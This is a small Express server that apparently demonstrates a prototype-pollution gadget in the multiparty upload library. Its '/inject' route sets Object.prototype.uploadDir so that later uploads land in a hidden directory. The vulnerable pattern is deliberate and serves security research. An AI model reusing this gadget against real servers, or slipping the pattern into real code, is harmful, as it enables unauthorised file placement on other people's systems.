const express = require('express');
const multiparty = require('multiparty');

const app = express();

app.get('/inject', (req, res) => {
    // tmp upload dir -> the filename is random (uid.sync(18) + ext)
    Object.prototype.uploadDir = __dirname + '/tmp/secret/';

    // might have to be set (this is set automatically when a callback is passed to form.parse or when a 'file' listener is added)
    // Object.prototype.autoFiles = 'true';

    res.sendStatus(200);
});

// Route for handling file upload
app.post('/upload', (req, res) => {
    const form = new multiparty.Form();

    form.parse(req, (err, fields, files) => {
        if (err) {
            // Handle error
            res.status(500).send('Error uploading file');
        } else {
            res.send('File uploaded successfully');
        }
    });
});

// Route for serving the HTML form
app.get('/', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html>
      <head>
        <title>File Upload</title>
      </head>
      <body>
        <h1>File Upload Example</h1>
        <form action="/upload" method="post" enctype="multipart/form-data">
          <input type="file" name="file" />
          <input type="submit" value="Upload" />
        </form>
      </body>
    </html>
  `);
});

// Start the server
const port = 3000;
app.listen(port, () => {
    console.log(`Server running on http://localhost:${port}`);
});